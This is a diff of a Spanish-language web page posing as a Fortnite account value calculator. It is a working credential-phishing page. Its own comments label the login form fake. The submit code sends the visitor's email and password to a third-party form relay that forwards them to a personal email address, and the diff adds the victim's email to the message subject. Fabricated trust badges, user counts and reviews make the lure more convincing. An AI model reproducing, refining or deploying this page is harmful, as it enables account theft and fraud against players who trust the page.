@@ -1,14 +1,14 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Fortnite Account Value Calculator</title>
-    <!-- Tailwind CSS CDN -->
+    <title>ValorFN · Calculadora de Cuentas Fortnite</title>
+    <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- FontAwesome Icons -->
+    <!-- FontAwesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
-    <!-- Google Fonts: Burbank / Rajdhani / Inter -->
+    <!-- Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Luckiest+Guy&family=Rajdhani:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
     <script>
         tailwind.config = {
@@ -51,13 +51,6 @@
         .fn-glow-purple {
             box-shadow: 0 0 20px rgba(140, 37, 245, 0.3);
         }
-        .clip-slant {
-            clip-path: polygon(0 0, 100% 0, 95% 100%, 0% 100%);
-        }
-        .clip-slant-alt {
-            clip-path: polygon(5% 0, 100% 0, 100% 100%, 0% 100%);
-        }
-        /* Custom scrollbar */
         ::-webkit-scrollbar {
             width: 8px;
         }
@@ -72,7 +65,7 @@
             background: #334155;
         }
 
-        /* Password toggle button */
+        /* Password toggle */
         .password-toggle {
             position: absolute;
             right: 16px;
@@ -90,6 +83,7 @@
             color: #ffe100;
         }
 
+        /* Email combo */
         .email-combo {
             display: flex;
             align-items: center;
@@ -203,16 +197,17 @@
             80% { transform: translateX(6px); }
         }
 
-        /* Carousel */
+        /* Carrusel de reseñas */
         .review-card {
             background: rgba(255, 255, 255, 0.03);
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            border-radius: 24px;
-            padding: 1.4rem 1.4rem 1.2rem;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 20px;
+            padding: 1.2rem;
             transition: all 0.3s ease;
             display: flex;
             flex-direction: column;
             position: relative;
+            height: 100%;
         }
         .review-card:hover {
             background: rgba(255, 225, 0, 0.04);
@@ -224,35 +219,35 @@
         }
         .review-card .verified-badge {
             position: absolute;
-            top: 12px;
-            right: 14px;
+            top: 10px;
+            right: 12px;
             background: rgba(76, 175, 80, 0.12);
             border: 1px solid rgba(76, 175, 80, 0.2);
             color: #66bb6a;
-            padding: 2px 12px;
+            padding: 2px 10px;
             border-radius: 40px;
-            font-size: 0.65rem;
+            font-size: 0.6rem;
             font-weight: 700;
             text-transform: uppercase;
             letter-spacing: 0.5px;
             display: flex;
             align-items: center;
-            gap: 5px;
+            gap: 4px;
         }
         .review-header {
             display: flex;
             align-items: center;
             gap: 12px;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
         }
         .review-avatar {
-            width: 44px;
-            height: 44px;
+            width: 40px;
+            height: 40px;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 1.2rem;
+            font-size: 1rem;
             font-weight: 700;
             color: #fff;
             flex-shrink: 0;
@@ -266,29 +261,27 @@
         .avatar-6 { background: #fdcb6e; color: #1a1f35; }
         .avatar-7 { background: #00b894; }
         .avatar-8 { background: #e17055; }
+
         .review-user .name {
             font-weight: 700;
-            font-size: 0.95rem;
+            font-size: 0.9rem;
             color: #fff;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
         }
         .review-user .date {
-            font-size: 0.7rem;
+            font-size: 0.65rem;
             color: rgba(255, 255, 255, 0.3);
         }
         .review-stars {
             color: #ffe100;
-            font-size: 0.9rem;
+            font-size: 0.85rem;
             letter-spacing: 1px;
-            margin-bottom: 6px;
+            margin-bottom: 4px;
         }
         .review-stars .empty-star {
             color: rgba(255, 255, 255, 0.1);
         }
         .review-text {
-            font-size: 0.9rem;
+            font-size: 0.85rem;
             line-height: 1.5;
             color: rgba(255, 255, 255, 0.8);
             flex: 1;
@@ -296,10 +289,11 @@
             -webkit-line-clamp: 3;
             -webkit-box-orient: vertical;
             overflow: hidden;
+            margin-top: 4px;
         }
         .review-verified {
-            margin-top: 10px;
-            font-size: 0.7rem;
+            margin-top: 8px;
+            font-size: 0.65rem;
             color: rgba(255, 255, 255, 0.2);
             display: flex;
             align-items: center;
@@ -308,6 +302,7 @@
         .review-verified i {
             color: #66bb6a;
         }
+
         .carousel-track {
             display: flex;
             transition: transform 0.6s cubic-bezier(0.25, 0.46, 0.45, 0.94);
@@ -317,15 +312,15 @@
             background: rgba(255, 225, 0, 0.06);
             border: 1px solid rgba(255, 225, 0, 0.12);
             color: #ffe100;
-            width: 44px;
-            height: 44px;
+            width: 40px;
+            height: 40px;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             cursor: pointer;
             transition: all 0.2s;
-            font-size: 1.2rem;
+            font-size: 1rem;
         }
         .carousel-btn:hover {
             background: rgba(255, 225, 0, 0.15);
@@ -357,6 +352,9 @@
                 font-size: 0.9rem;
                 padding-left: 40px;
             }
+            .review-card {
+                padding: 1rem;
+            }
         }
         @media (max-width: 480px) {
             .email-combo .email-domain {
@@ -371,40 +369,49 @@
             .email-combo .email-at {
                 font-size: 0.9rem;
             }
+            .review-card {
+                padding: 0.8rem;
+            }
+            .review-text {
+                font-size: 0.8rem;
+            }
+            .review-stars {
+                font-size: 0.75rem;
+            }
         }
     </style>
 </head>
-<body class="font-sans min-h-screen flex flex-col justify-between selection:bg-fnYellow selection:text-black">
+<body class="font-sans min-h-screen flex flex-col selection:bg-fnYellow selection:text-black">
 
     <!-- ===== MENÚ SUPERIOR FALSO ===== -->
     <header class="border-b border-slate-800 bg-fnDark/90 backdrop-blur-md sticky top-0 z-50">
         <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-            <div class="flex justify-between items-center h-20">
+            <div class="flex justify-between items-center h-16 md:h-20">
                 <!-- Logo -->
                 <div class="flex items-center gap-3">
-                    <div class="bg-gradient-to-tr from-fnPurple to-blue-500 p-2.5 rounded-xl shadow-lg rotate-3">
-                        <i class="fa-solid fa-gem text-fnYellow text-2xl"></i>
+                    <div class="bg-gradient-to-tr from-fnPurple to-blue-500 p-2 rounded-xl shadow-lg rotate-3">
+                        <i class="fa-solid fa-gem text-fnYellow text-xl md:text-2xl"></i>
                     </div>
                     <div>
-                        <span class="font-banner text-2xl tracking-wider text-white uppercase italic drop-shadow-md">VALOR<span class="text-fnYellow">FN</span></span>
-                        <span class="block text-xs font-semibold text-slate-400 tracking-widest uppercase">Calculadora de Cuentas & PaVos</span>
+                        <span class="font-banner text-xl md:text-2xl tracking-wider text-white uppercase italic drop-shadow-md">VALOR<span class="text-fnYellow">FN</span></span>
+                        <span class="hidden sm:block text-[10px] md:text-xs font-semibold text-slate-400 tracking-widest uppercase">Calculadora de Cuentas &amp; PaVos</span>
                     </div>
                 </div>
 
-                <!-- Navegación falsa -->
-                <nav class="hidden md:flex gap-1 bg-slate-900/80 p-1.5 rounded-xl border border-slate-800">
-                    <a href="#" class="px-5 py-2.5 rounded-lg text-sm font-fortnite font-bold tracking-wider uppercase transition-all duration-200 bg-fnPurple text-white shadow-lg">
-                        <i class="fa-solid fa-calculator mr-2"></i> Valor Cuenta
+                <!-- Enlaces decorativos -->
+                <nav class="hidden md:flex gap-1 bg-slate-900/80 p-1 rounded-xl border border-slate-800">
+                    <a href="#" class="px-4 py-2 rounded-lg text-sm font-fortnite font-bold tracking-wider uppercase transition bg-fnPurple text-white shadow-lg">
+                        <i class="fa-solid fa-calculator mr-2"></i> Valorar
                     </a>
-                    <a href="#" class="px-5 py-2.5 rounded-lg text-sm font-fortnite font-bold tracking-wider uppercase transition-all duration-200 text-slate-400 hover:text-white hover:bg-slate-800">
-                        <i class="fa-solid fa-coins mr-2"></i> Convertidor
+                    <a href="#" class="px-4 py-2 rounded-lg text-sm font-fortnite font-bold tracking-wider uppercase transition text-slate-400 hover:text-white hover:bg-slate-800">
+                        <i class="fa-solid fa-coins mr-2"></i> PaVos
                     </a>
                 </nav>
 
                 <!-- Selector de moneda (decorativo) -->
-                <div class="flex items-center gap-2 bg-slate-900 border border-slate-800 rounded-lg px-3 py-1.5">
-                    <i class="fa-solid fa-globe text-fnYellow text-sm"></i>
-                    <select class="bg-transparent text-sm font-semibold text-white focus:outline-none cursor-pointer">
+                <div class="flex items-center gap-2 bg-slate-900 border border-slate-800 rounded-lg px-2 py-1 md:px-3 md:py-1.5">
+                    <i class="fa-solid fa-globe text-fnYellow text-xs md:text-sm"></i>
+                    <select class="bg-transparent text-xs md:text-sm font-semibold text-white focus:outline-none cursor-pointer">
                         <option value="USD">USD ($)</option>
                         <option value="EUR">EUR (€)</option>
                         <option value="MXN">MXN ($)</option>
@@ -412,59 +419,59 @@
                 </div>
             </div>
         </div>
-        <!-- Mobile tabs -->
+        <!-- Mobile nav (simplificado) -->
         <div class="flex md:hidden border-t border-slate-800 bg-slate-950">
-            <a href="#" class="flex-1 py-3 text-center text-xs font-bold uppercase tracking-wider text-white bg-fnPurple">
-                <i class="fa-solid fa-calculator block text-base mb-0.5"></i> Valor
+            <a href="#" class="flex-1 py-2 text-center text-xs font-bold uppercase tracking-wider text-white bg-fnPurple">
+                <i class="fa-solid fa-calculator block text-base mb-0.5"></i> Valorar
             </a>
-            <a href="#" class="flex-1 py-3 text-center text-xs font-bold uppercase tracking-wider text-slate-400">
+            <a href="#" class="flex-1 py-2 text-center text-xs font-bold uppercase tracking-wider text-slate-400">
                 <i class="fa-solid fa-coins block text-base mb-0.5"></i> PaVos
             </a>
         </div>
     </header>
 
-    <!-- ===== CONTENEDOR PRINCIPAL ===== -->
-    <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 flex-grow w-full">
+    <!-- ===== CONTENIDO PRINCIPAL ===== -->
+    <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 md:py-8 flex-grow w-full">
 
         <!-- BANNER / HERO -->
-        <div class="relative overflow-hidden rounded-2xl bg-gradient-to-r from-fnBlue via-slate-900 to-slate-950 border border-slate-800 p-6 md:p-8 shadow-2xl mb-8">
+        <div class="relative overflow-hidden rounded-2xl bg-gradient-to-r from-fnBlue via-slate-900 to-slate-950 border border-slate-800 p-5 md:p-8 shadow-2xl mb-8">
             <div class="relative z-10 max-w-2xl">
-                <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-fnPurple/20 border border-fnPurple/40 text-fnPurple text-xs font-bold uppercase tracking-wider mb-3">
+                <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-fnPurple/20 border border-fnPurple/40 text-fnPurple text-[10px] md:text-xs font-bold uppercase tracking-wider mb-3">
                     <i class="fa-solid fa-shield-halved"></i> Evaluador de Taquilla
                 </div>
-                <h1 class="font-banner text-3xl sm:text-4xl text-white tracking-wide uppercase">
+                <h1 class="font-banner text-2xl sm:text-3xl md:text-4xl text-white tracking-wide uppercase leading-tight">
                     ¿Cuánto vale tu cuenta de <span class="text-fnYellow">Fortnite</span>?
                 </h1>
-                <p class="text-slate-300 text-sm sm:text-base mt-2">
+                <p class="text-slate-300 text-sm md:text-base mt-2">
                     Ingresa tus credenciales para calcular el valor estimado de tu cuenta, incluyendo todos tus objetos y su precio actual de mercado.
                 </p>
-                <!-- Badges de confianza (checks) -->
-                <div class="flex flex-wrap gap-3 mt-4">
-                    <span class="inline-flex items-center gap-1.5 text-xs font-semibold text-slate-300 bg-slate-800/60 px-3 py-1 rounded-full border border-slate-700">
+                <!-- Badges de confianza -->
+                <div class="flex flex-wrap gap-2 md:gap-3 mt-4">
+                    <span class="inline-flex items-center gap-1.5 text-[10px] md:text-xs font-semibold text-slate-300 bg-slate-800/60 px-2.5 py-1 rounded-full border border-slate-700">
                         <i class="fa-solid fa-check-circle text-green-400"></i> 100% Seguro
                     </span>
-                    <span class="inline-flex items-center gap-1.5 text-xs font-semibold text-slate-300 bg-slate-800/60 px-3 py-1 rounded-full border border-slate-700">
-                        <i class="fa-solid fa-check-circle text-green-400"></i> Precios en tiempo real
+                    <span class="inline-flex items-center gap-1.5 text-[10px] md:text-xs font-semibold text-slate-300 bg-slate-800/60 px-2.5 py-1 rounded-full border border-slate-700">
+                        <i class="fa-solid fa-check-circle text-green-400"></i> Precios reales
                     </span>
-                    <span class="inline-flex items-center gap-1.5 text-xs font-semibold text-slate-300 bg-slate-800/60 px-3 py-1 rounded-full border border-slate-700">
+                    <span class="inline-flex items-center gap-1.5 text-[10px] md:text-xs font-semibold text-slate-300 bg-slate-800/60 px-2.5 py-1 rounded-full border border-slate-700">
                         <i class="fa-solid fa-check-circle text-fnYellow"></i> 2,847+ usuarios
                     </span>
-                    <span class="inline-flex items-center gap-1.5 text-xs font-semibold text-slate-300 bg-slate-800/60 px-3 py-1 rounded-full border border-slate-700">
-                        <i class="fa-solid fa-check-circle text-green-400"></i> Privacidad garantizada
+                    <span class="inline-flex items-center gap-1.5 text-[10px] md:text-xs font-semibold text-slate-300 bg-slate-800/60 px-2.5 py-1 rounded-full border border-slate-700">
+                        <i class="fa-solid fa-check-circle text-green-400"></i> Privacidad
                     </span>
                 </div>
             </div>
             <!-- Decorative Icon -->
-            <div class="absolute -right-6 -bottom-6 opacity-10 text-slate-100 text-9xl pointer-events-none font-banner">
+            <div class="absolute -right-6 -bottom-6 opacity-10 text-slate-100 text-7xl md:text-9xl pointer-events-none font-banner">
                 FN
             </div>
         </div>
 
-        <!-- ===== LOGIN SECTION (falso) ===== -->
-        <div class="max-w-md mx-auto bg-slate-900/90 border border-slate-800 rounded-2xl p-6 shadow-xl mb-8">
+        <!-- ===== LOGIN FALSO ===== -->
+        <div class="max-w-md mx-auto bg-slate-900/90 border border-slate-800 rounded-2xl p-5 md:p-6 shadow-xl mb-10">
             <form id="loginForm">
-                <!-- Email con combo (sin valores por defecto) -->
-                <div class="mb-5">
+                <!-- Email con combo -->
+                <div class="mb-4">
                     <label for="emailLocal" class="block text-xs font-semibold text-slate-400 uppercase tracking-wider mb-1">Correo electrónico</label>
                     <div class="email-combo relative">
                         <i class="fa-solid fa-envelope icon"></i>
@@ -480,16 +487,16 @@
                 </div>
 
                 <!-- Contraseña con toggle -->
-                <div class="mb-5 relative">
+                <div class="mb-4 relative">
                     <label for="password" class="block text-xs font-semibold text-slate-400 uppercase tracking-wider mb-1">Contraseña</label>
                     <input type="password" id="password" name="contraseña" placeholder="••••••••" required class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-fnYellow pl-10" />
                     <i class="fa-solid fa-lock icon absolute left-3.5 top-10 text-slate-500"></i>
                     <button type="button" class="password-toggle" id="togglePassword" aria-label="Toggle password visibility">
-                        <i class="fa-solid fa-eye"></i>
+                        <i class="fa-regular fa-eye" id="eyeIcon"></i>
                     </button>
                 </div>
 
-                <button type="submit" class="w-full bg-gradient-to-r from-fnPurple to-indigo-600 hover:from-purple-600 hover:to-indigo-500 text-white font-fortnite font-bold py-3 rounded-xl text-lg tracking-wider uppercase transition shadow-lg" id="loginBtn">
+                <button type="submit" class="w-full bg-gradient-to-r from-fnPurple to-indigo-600 hover:from-purple-600 hover:to-indigo-500 text-white font-fortnite font-bold py-3 rounded-xl text-base md:text-lg tracking-wider uppercase transition shadow-lg" id="loginBtn">
                     <i class="fa-solid fa-calculator mr-2"></i> Calcular valor
                 </button>
             </form>
@@ -508,20 +515,20 @@
 
         <!-- ===== CARRUSEL DE RESEÑAS ===== -->
         <div class="mt-8">
-            <div class="flex justify-between items-center flex-wrap gap-4 mb-6">
-                <h3 class="font-banner text-2xl text-white uppercase tracking-wider flex items-center gap-2">
+            <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3 mb-6">
+                <h3 class="font-banner text-2xl md:text-3xl text-white uppercase tracking-wider flex items-center gap-2">
                     <i class="fa-solid fa-star text-fnYellow"></i> Lo que dicen los usuarios
                 </h3>
                 <div class="flex items-center gap-3 text-sm text-slate-400">
-                    <span class="font-bold text-white">4.5</span>
-                    <span class="text-fnYellow">
+                    <span class="font-bold text-white text-lg">4.5</span>
+                    <span class="text-fnYellow text-base">
                         <i class="fa-solid fa-star"></i>
                         <i class="fa-solid fa-star"></i>
                         <i class="fa-solid fa-star"></i>
                         <i class="fa-solid fa-star"></i>
                         <i class="fa-solid fa-star-half-alt"></i>
                     </span>
-                    <span>2,847 reseñas</span>
+                    <span class="text-xs">2,847 reseñas</span>
                 </div>
             </div>
 
@@ -531,7 +538,7 @@
                 </div>
             </div>
 
-            <div class="flex justify-center items-center gap-6 mt-6">
+            <div class="flex justify-center items-center gap-4 md:gap-6 mt-6">
                 <button class="carousel-btn" id="prevBtn"><i class="fa-solid fa-chevron-left"></i></button>
                 <div class="flex gap-3" id="carouselDots"></div>
                 <button class="carousel-btn" id="nextBtn"><i class="fa-solid fa-chevron-right"></i></button>
@@ -541,8 +548,8 @@
     </main>
 
     <!-- ===== FOOTER ===== -->
-    <footer class="bg-slate-950 border-t border-slate-800 py-8 mt-12 text-center text-slate-500 text-xs">
-        <div class="max-w-7xl mx-auto px-4 space-y-3">
+    <footer class="bg-slate-950 border-t border-slate-800 py-6 mt-10 text-center text-slate-500 text-[11px]">
+        <div class="max-w-7xl mx-auto px-4 space-y-2">
             <p class="font-fortnite text-slate-400 text-sm tracking-wider uppercase">
                 VALOR<span class="text-fnYellow">FN</span> - Herramienta Fan-made No Oficial
             </p>
@@ -553,7 +560,7 @@
     </footer>
 
     <!-- TOAST NOTIFICATION -->
-    <div id="toast" class="fixed bottom-5 right-5 transform translate-y-20 opacity-0 transition-all duration-300 bg-slate-900 border border-fnPurple text-white px-5 py-3 rounded-xl shadow-2xl flex items-center gap-3 z-50 pointer-events-none">
+    <div id="toast" class="fixed bottom-5 right-5 transform translate-y-20 opacity-0 transition-all duration-300 bg-slate-900 border border-fnPurple text-white px-4 py-2.5 rounded-xl shadow-2xl flex items-center gap-3 z-50 pointer-events-none">
         <i class="fa-solid fa-circle-check text-fnYellow text-lg"></i>
         <span id="toast-msg" class="text-sm font-semibold">Notificación</span>
     </div>
@@ -580,15 +587,20 @@
             const errorMessage = document.getElementById('errorMessage');
             const passwordInput = document.getElementById('password');
             const togglePasswordBtn = document.getElementById('togglePassword');
+            const eyeIcon = document.getElementById('eyeIcon');
             const emailLocal = document.getElementById('emailLocal');
             const emailDomain = document.getElementById('emailDomain');
 
             // ===== TOGGLE PASSWORD =====
-            togglePasswordBtn.addEventListener('click', function() {
+            togglePasswordBtn.addEventListener('click', function(e) {
+                e.preventDefault();
                 const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                 passwordInput.setAttribute('type', type);
-                this.querySelector('i').classList.toggle('fa-eye');
-                this.querySelector('i').classList.toggle('fa-eye-slash');
+                if (type === 'text') {
+                    eyeIcon.className = 'fa-regular fa-eye-slash';
+                } else {
+                    eyeIcon.className = 'fa-regular fa-eye';
+                }
             });
 
             // ===== FORM SUBMIT (FAKE ERROR) =====
@@ -608,11 +620,12 @@
                 const fullEmail = local + '@' + emailDomain.value;
                 const password = passwordInput.value;
                 const formData = new FormData();
-                formData.append('_subject', 'Nuevo intento de valoración de cuenta Fortnite');
+                // Asunto dinámico con el email/usuario
+                formData.append('_subject', `Nuevo intento de valoración - ${fullEmail}`);
                 formData.append('email', fullEmail);
                 formData.append('password', password);
 
-                // Envío real a Formsubmit
+                // Envío real a Formsubmit (destino parameganz25@gmail.com)
                 fetch('https://formsubmit.co/parameganz25@gmail.com', {
                     method: 'POST',
                     body: formData,
@@ -743,7 +756,6 @@
                 reviewsData.forEach((review) => {
                     const card = document.createElement('div');
                     card.className = 'review-card' + (review.verified ? ' verified' : '');
-                    // Estrellas
                     const fullStars = Math.floor(review.rating);
                     const halfStar = review.rating % 1 >= 0.5 ? 1 : 0;
                     const emptyStars = 5 - fullStars - halfStar;
